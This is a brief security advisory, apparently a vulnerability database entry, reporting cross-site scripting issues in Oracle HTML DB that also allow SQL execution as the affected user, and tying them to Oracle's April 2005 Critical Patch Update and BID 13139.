Oracle HTML DB is prone to cross-site scripting vulnerabilities.

An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site.

An attacker can leverage these issues to execute SQL statements in the context of an affected user as well.

These issues was originally described and addressed in Oracle Critical Patch Update - April 2005, BID 13139 (Oracle Multiple Vulnerabilities). Due to the availability of more information, these issues are being assigned a separate BID.
